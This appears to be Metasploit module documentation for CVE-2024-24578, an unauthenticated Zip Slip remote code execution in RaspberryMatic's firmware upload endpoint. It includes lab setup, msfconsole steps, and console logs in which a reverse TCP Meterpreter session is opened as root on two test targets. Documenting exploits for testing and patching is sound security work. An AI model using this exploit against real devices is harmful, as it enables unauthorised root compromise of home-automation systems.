## Vulnerable Application
RaspberryMatic / OCCU contains a unauthenticated remote code execution (RCE) vulnerability, caused by multiple issues within
the Java based HMIPServer.jar component. The webui allows for Firmware uploads which can be reached through the URL
`/pages/jpages/system/DeviceFirmware/addFirmware`.
This allows an unauthenticated attacker to upload a malicious .tgz archive to the server, which will be automatically
extracted without any further checks. As this entry can contain ../sequences, it is possible to break out of the predefined
temp directory and write files to other locations outside this path.

This vulnerability is commonly known as the Zip Slip vulnerability and can be used to overwrite arbitrary files on the main
filesystem. It is therefore possible to overwrite the watchdog script with a malicious payload in `/usr/local/addons/mediola/bin/`,
which will be executed every five minutes through a cron job where attackers can gain remote code execution as root user,
allowing a full system compromise.

RaspberryMatic versions <= `3.73.9.20240130` are vulnerable.

The following releases were tested.

**RaspberryMatic Releases:**
* RaspberryMatic v3.73.9 (OVA image)
* RaspberryMatic v3.65.8 (Raspberry Pi4 Model B image)

## Installation steps to install RaspberryMatic OVA image
* Install your favorite virtualization engine (VMware or VirtualBox) on your preferred platform.
* Here are the installation instructions for [VirtualBox on MacOS](https://tecadmin.net/how-to-install-virtualbox-on-macos/).
* Download [RaspberryMatic OVA](https://github.com/jens-maus/RaspberryMatic/releases/tag/3.73.9.20240130).
* Install the OVA image in your virtualization engine.
* When installed, configure the VM appliance to your needs using the menu options via the `webui`.
* Boot up the VM and should be able to access the RaspberryMatic appliance via the `webui` via `http://your_ip/`.

You are now ready to test the module.

## Verification Steps
- [ ] Start `msfconsole`
- [ ] `use exploit/linux/http/raspberrymatic_unauth_rce_cve_2024_24578`
- [ ] `set rhosts <ip-target>`
- [ ] `set rport <port>`
- [ ] `set lhost <attacker-ip>`
- [ ] `set target <0=Unix/Linux Command>`
- [ ] `exploit`
- [ ] you should get a `reverse shell` or `Meterpreter` session depending on the `payload` and `target` settings

## Options
No specific options defined.

## Scenarios
### RaspberryMatic OVA appliance - Unix/Linux Command x64 target
```msf
msf6 exploit(linux/http/raspberrymatic_unauth_rce_cve_2024_24578) > set rhosts 192.168.201.6
rhosts => 192.168.201.6
msf6 exploit(linux/http/raspberrymatic_unauth_rce_cve_2024_24578) > set FETCH_SRVHOST 192.168.201.8
FETCH_SRVHOST => 192.168.201.8
msf6 exploit(linux/http/raspberrymatic_unauth_rce_cve_2024_24578) > set FETCH_WRITABLE_DIR /tmp
FETCH_WRITABLE_DIR => /tmp
msf6 exploit(linux/http/raspberrymatic_unauth_rce_cve_2024_24578) > rexploit
[*] Reloading module...
[*] Started reverse TCP handler on 192.168.201.8:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking if 192.168.201.6:443 can be exploited.
[+] The target appears to be vulnerable. RaspberryMatic 3.73.9
[*] Executing Unix/Linux Command for cmd/linux/http/x64/meterpreter/reverse_tcp
[*] Uploading sT2s4fChKUZ.tgz
[*] Waiting 5 minutes for watchdog execution via cron to trigger the RCE.
[*] Sending stage (3045380 bytes) to 192.168.201.6
[*] Restoring original watchdog script.
[*] Meterpreter session 1 opened (192.168.201.8:4444 -> 192.168.201.6:51220) at 2025-01-28 18:00:01 +0000

meterpreter > sysinfo
Computer     : 192.168.201.6
OS           :  (Linux 6.1.74)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > getuid
Server username: root
meterpreter > pwd
/root
meterpreter >
```
### RaspberryMatic Pi4 Model B compute board - Unix/Linux Command aarch64 target
```msf
msf6 exploit(linux/http/raspberrymatic_unauth_rce_cve_2024_24578) > set payload cmd/linux/http/aarch64/meterpreter_reverse_tcp
payload => cmd/linux/http/aarch64/meterpreter_reverse_tcp
msf6 exploit(linux/http/raspberrymatic_unauth_rce_cve_2024_24578) > set rhosts 192.168.201.10
rhosts => 192.168.201.10
msf6 exploit(linux/http/raspberrymatic_unauth_rce_cve_2024_24578) > rexploit
[*] Reloading module...
[*] Started reverse TCP handler on 192.168.201.8:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking if 192.168.201.10:443 can be exploited.
[+] The target appears to be vulnerable. RaspberryMatic 3.65.8
[*] Executing Unix/Linux Command for cmd/linux/http/aarch64/meterpreter_reverse_tcp
[*] Uploading 8emVtVt6U.tgz
[*] Waiting 5 minutes for watchdog execution via cron to trigger the RCE.
[*] Restoring original watchdog script.
[*] Meterpreter session 2 opened (192.168.201.8:4444 -> 192.168.201.10:40324) at 2025-02-03 17:40:01 +0000
meterpreter > sysinfo
Computer     : 192.168.201.10
OS           :  (Linux 5.15.56)
Architecture : aarch64
BuildTuple   : aarch64-linux-musl
Meterpreter  : aarch64/linux
meterpreter > getuid
Server username: root
meterpreter > pwd
/root
meterpreter >
```
## Limitations
You have to wait maximum five minutes for a session to allow `cron` to run the malicious watchdog script
containing the payload. Just be patient and wait for the magic to happen ;-)
Another limitation is that the root filesystem on RaspberyMatic image is mounted read-only, so you need to set the
option `FETCH_WRITABLE_DIR` to `/tmp` (this is mounted RW) otherwise the exploit will fail.
